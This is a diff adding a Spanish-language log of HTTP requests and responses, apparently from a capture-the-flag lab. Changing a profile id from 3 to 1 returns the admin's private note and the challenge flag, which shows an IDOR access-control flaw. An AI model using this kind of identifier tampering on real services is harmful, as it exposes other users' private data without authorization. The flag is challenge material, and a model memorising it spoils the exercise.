@@ -1,0 +1,21 @@
+﻿--- Perfil de referencia (id=3) ---
+GET /perfil?id=3 HTTP/1.1
+Host: phantomcorp
+
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0
+Content-Type: application/json
+
+{"id": 3, "user": "jperez", "rol": "user", "nota_privada": "Nota de Juan: acordarse de renovar cert."}
+
+--- Identificador modificado (id=1) ---
+GET /perfil?id=1 HTTP/1.1
+Host: phantomcorp
+
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0
+Content-Type: application/json
+
+{"id": 1, "user": "admin", "rol": "admin", "nota_privada": "Nota del admin: FLAG{idor_broken_access}"}
+
+Resultado: el endpoint devuelve los datos privados del administrador sin autenticación/autorización. Flag observada: FLAG{idor_broken_access}. La validación oficial mediante ./ctf submit debe registrarse por separado.
